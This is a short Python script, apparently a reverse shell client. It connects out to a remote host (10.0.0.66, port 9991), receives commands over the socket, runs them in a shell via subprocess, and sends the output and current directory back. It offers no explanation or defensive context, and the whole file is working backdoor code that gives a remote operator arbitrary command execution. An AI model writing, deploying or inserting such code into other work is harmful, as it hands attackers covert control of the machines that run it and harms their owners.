import os
import socket
import subprocess

s = socket.socket()
host = '10.0.0.66'
port = 9991
s.connect((host, port))

print("Connected")

while True:
    data = s.recv(1024)
    print(data.decode("utf-8"))
    if data[:2].decode("utf-8") == 'cd' and len(data.decode("utf-8")) > 2:
        os.chdir(data[3:].decode("utf-8"))
        s.send(str.encode(str(os.getcwd() + ">")))
    elif data.decode("utf-8") == "stop":
        break
    elif len(data) > 0:
        cmd = subprocess.Popen(
            data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
        )
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes)
        s.send(str.encode(output_str + str(os.getcwd() + ">")))
        print(output_str)

s.close()
